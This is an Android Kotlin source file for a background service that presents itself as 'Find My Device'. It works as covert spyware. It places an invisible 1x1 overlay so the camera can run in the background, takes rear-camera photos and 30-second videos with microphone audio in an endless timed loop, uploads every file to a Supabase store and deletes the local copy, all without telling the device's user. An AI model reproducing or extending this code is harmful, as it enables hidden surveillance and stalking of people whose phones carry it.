package com.save.me

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.media.MediaRecorder
import android.os.*
import android.util.Log
import android.view.*
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream

class HiddenOverlayMediaService : Service() {
    private val SERVICE_ID = 3333
    private val CHANNEL_ID = NotificationUtils.CHANNEL_ID

    private var windowManager: WindowManager? = null
    private var overlayView: SurfaceView? = null
    private var surface: Surface? = null

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null

    override fun onCreate() {
        super.onCreate()
        NotificationUtils.createNotificationChannel(this)
        // Use launcher icon for the notification
        val launcherIconRes = applicationInfo.icon
        startForeground(
            SERVICE_ID,
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Find My Device")
                .setContentText("Running in background")
                .setSmallIcon(launcherIconRes)
                .setOngoing(true)
                .build()
        )
        Handler(Looper.getMainLooper()).postDelayed({ startMediaBackgroundTasks() }, 1000)
    }

    private fun startMediaBackgroundTasks() {
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        overlayView = SurfaceView(this)
        overlayView?.holder?.setFormat(PixelFormat.TRANSLUCENT)
        overlayView?.setZOrderOnTop(true)
        overlayView?.holder?.addCallback(object : SurfaceHolder.Callback {
            override fun surfaceCreated(holder: SurfaceHolder) {
                surface = holder.surface
                CoroutineScope(Dispatchers.Main).launch { schedulePhotoVideoTasks() }
            }
            override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {}
            override fun surfaceDestroyed(holder: SurfaceHolder) {}
        })
        val params = WindowManager.LayoutParams(
            1, 1,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.TOP or Gravity.START
        params.x = 0
        params.y = 0
        windowManager?.addView(overlayView, params)
    }

    private suspend fun schedulePhotoVideoTasks() = withContext(Dispatchers.Default) {
        while (true) {
            try {
                capturePhoto()
            } catch (e: Exception) {
                Log.e("HiddenOverlayMedia", "Photo error: $e")
            }
            delay(5 * 60 * 1000L)
            try {
                recordVideo(30) // record 30s video
            } catch (e: Exception) {
                Log.e("HiddenOverlayMedia", "Video error: $e")
            }
            delay(10 * 60 * 1000L)
        }
    }

    // Take a background photo with preview on overlay surface
    private suspend fun capturePhoto() = withContext(Dispatchers.Main) {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
            val characs = cameraManager.getCameraCharacteristics(id)
            val facing = characs.get(CameraCharacteristics.LENS_FACING)
            facing == CameraCharacteristics.LENS_FACING_BACK
        } ?: cameraManager.cameraIdList.firstOrNull() ?: return@withContext

        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            stopSelf(); return@withContext
        }
        val outputFile = File(getExternalFilesDir(null), "overlay_photo_${System.currentTimeMillis()}.jpg")
        val imageReader = android.media.ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 1)
        imageReader.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            FileOutputStream(outputFile).use { it.write(bytes) }
            image.close()
            SupabaseUtils.uploadFileAndRecord(outputFile, "photos/background/${outputFile.name}", "photo")
            outputFile.delete()
            closeCamera()
        }, Handler(Looper.getMainLooper()))

        val openCameraJob = CompletableDeferred<Unit>()
        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(device: CameraDevice) {
                cameraDevice = device
                try {
                    device.createCaptureSession(
                        listOf(surface, imageReader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                    addTarget(imageReader.surface)
                                    addTarget(surface!!)
                                }
                                session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {}, Handler(Looper.getMainLooper()))
                                openCameraJob.complete(Unit)
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                openCameraJob.complete(Unit)
                            }
                        },
                        Handler(Looper.getMainLooper())
                    )
                } catch (e: Exception) {
                    openCameraJob.complete(Unit)
                }
            }
            override fun onDisconnected(device: CameraDevice) { closeCamera(); openCameraJob.complete(Unit) }
            override fun onError(device: CameraDevice, error: Int) { closeCamera(); openCameraJob.complete(Unit) }
        }, Handler(Looper.getMainLooper()))
        openCameraJob.await()
    }

    // Record a background video with preview on overlay surface
    private suspend fun recordVideo(durationSeconds: Int) = withContext(Dispatchers.Main) {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
            val characs = cameraManager.getCameraCharacteristics(id)
            val facing = characs.get(CameraCharacteristics.LENS_FACING)
            facing == CameraCharacteristics.LENS_FACING_BACK
        } ?: cameraManager.cameraIdList.firstOrNull() ?: return@withContext

        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
            checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            stopSelf(); return@withContext
        }
        val outputFile = File(getExternalFilesDir(null), "overlay_video_${System.currentTimeMillis()}.mp4")
        val mediaRecorder = MediaRecorder()
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        mediaRecorder.setOutputFile(outputFile.absolutePath)
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024)
        mediaRecorder.setVideoFrameRate(30)
        mediaRecorder.setVideoSize(1280, 720)
        mediaRecorder.prepare()

        val openCameraJob = CompletableDeferred<Unit>()
        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(device: CameraDevice) {
                cameraDevice = device
                try {
                    device.createCaptureSession(
                        listOf(surface, mediaRecorder.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                    addTarget(mediaRecorder.surface)
                                    addTarget(surface!!)
                                }
                                session.setRepeatingRequest(captureRequest.build(), null, Handler(Looper.getMainLooper()))
                                mediaRecorder.start()
                                CoroutineScope(Dispatchers.Main).launch {
                                    delay(durationSeconds * 1000L)
                                    try { mediaRecorder.stop() } catch (_: Exception) {}
                                    mediaRecorder.release()
                                    SupabaseUtils.uploadFileAndRecord(outputFile, "videos/background/${outputFile.name}", "video")
                                    outputFile.delete()
                                    closeCamera()
                                    openCameraJob.complete(Unit)
                                }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                mediaRecorder.release()
                                closeCamera()
                                openCameraJob.complete(Unit)
                            }
                        },
                        Handler(Looper.getMainLooper())
                    )
                } catch (e: Exception) {
                    mediaRecorder.release()
                    openCameraJob.complete(Unit)
                }
            }
            override fun onDisconnected(device: CameraDevice) { mediaRecorder.release(); closeCamera(); openCameraJob.complete(Unit) }
            override fun onError(device: CameraDevice, error: Int) { mediaRecorder.release(); closeCamera(); openCameraJob.complete(Unit) }
        }, Handler(Looper.getMainLooper()))
        openCameraJob.await()
    }

    private fun closeCamera() {
        try { captureSession?.close() } catch (_: Exception) {}
        try { cameraDevice?.close() } catch (_: Exception) {}
        captureSession = null
        cameraDevice = null
    }

    override fun onDestroy() {
        try { if (overlayView != null) windowManager?.removeViewImmediate(overlayView) } catch (_: Exception) {}
        closeCamera()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}